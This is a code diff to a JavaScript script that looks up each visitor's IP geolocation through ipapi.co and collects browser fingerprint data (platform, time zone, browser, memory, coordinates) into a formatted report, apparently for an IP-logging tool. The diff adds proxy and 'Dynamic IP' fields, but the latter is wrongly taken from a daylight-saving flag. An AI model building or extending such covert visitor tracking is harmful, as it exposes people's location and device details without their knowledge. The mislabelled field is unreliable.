@@ -71,6 +71,8 @@ fetch('https://ipapi.co/json/')
         const osname = navigator.platform;
         const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
         const browser = getBrowserInfo();
+        const isProxy = data.proxy;
+        const isDynamic = data.is_dst;
         let userid = document.createElement('p');
      
        let systemTime = new Date();
@@ -96,7 +98,9 @@ fetch('https://ipapi.co/json/')
     }
     
     let formedDate = day + '.' + month + '.' + year;
-      
+
+    let proxyornot = isProxy ? "Yes" : "No";
+    let dynamicorno = isDynamic ? "Yes" : "No";
       
     let memory = navigator.deviceMemory;
   
@@ -112,6 +116,8 @@ fetch('https://ipapi.co/json/')
     *├ Region: ${region}*
     *├ Timezone IP: ${time}*
     *├ Coordinates: ${longitude} ${latitude},*
+    *├ Proxy: ${proxyornot},*
+    *├ Dynamic IP: ${dynamicorno},*
       * System 🖥*
     *├ Browser: ${browser}*
     *├ + Os: ${osname}*
